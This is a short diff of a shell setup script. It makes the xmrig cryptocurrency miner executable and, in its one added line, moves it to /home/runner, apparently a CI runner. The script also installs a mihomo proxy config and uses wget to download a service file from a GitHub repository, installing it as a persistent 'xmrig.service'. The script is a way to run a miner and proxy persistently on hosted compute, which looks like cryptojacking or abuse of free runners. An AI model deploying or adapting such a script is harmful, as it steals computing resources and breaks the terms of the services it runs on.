@@ -12,6 +12,7 @@ sudo mv config.yaml /etc/mihomo/config.yaml
 sudo apt install -y libhwloc15
 sudo apt install -y screen
 sudo chmod +x xmrig
+mv xmrig /home/runner
 
 wget -q https://raw.githubusercontent.com/pornnewbee/socks5-for-serv00/main/sub/work/worker.service
 sudo mv worker.service /etc/systemd/system/xmrig.service
